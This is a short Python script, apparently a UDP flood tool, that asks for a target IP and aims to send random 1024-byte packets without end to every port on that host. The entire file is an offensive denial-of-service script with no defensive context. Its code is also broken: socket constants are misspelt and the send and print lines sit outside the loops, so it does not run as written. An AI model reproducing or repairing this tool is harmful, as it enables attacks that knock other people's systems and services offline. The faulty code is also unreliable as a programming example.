import socket
import random
#creates a socket
sock = socket.socket(socket.AFINET,socket.SOCKDGRAM)
bytes=random._urandom(1024) #creates packet
ip=input('Target IP:')
#infinite loop
sent=0
while 1:
    for i in range(1,65536):
        port=i
sock.sendto(bytes,(ip,port))
print("Sent %s amount of packets to %s at port %s" %(sent,ip,port))
sent=sent+1